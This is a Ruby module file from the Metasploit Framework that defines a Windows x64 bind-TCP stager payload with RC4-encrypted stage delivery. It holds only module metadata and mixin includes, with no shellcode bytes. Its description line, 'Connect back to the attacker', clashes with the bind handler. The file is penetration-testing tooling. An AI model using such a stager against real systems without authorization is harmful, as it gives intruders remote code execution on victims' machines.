# -*- coding: binary -*-
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/windows/x64/bind_tcp_rc4'


module MetasploitModule

  CachedSize = 616

  include Msf::Payload::Stager
  include Msf::Payload::Windows::BindTcpRc4_x64

  def self.handler_type_alias
    "bind_tcp_rc4"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager (RC4 Stage Encryption, Metasm)',
      'Description'   => 'Connect back to the attacker',
      'Author'        => ['hdm', 'skape', 'sf', 'mihi', 'max3raza', 'RageLtMan'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::BindTcp,
      'Convention'    => 'sockrdi',
      'Stager'        => { 'RequiresMidstager' => false }
      ))
  end
end
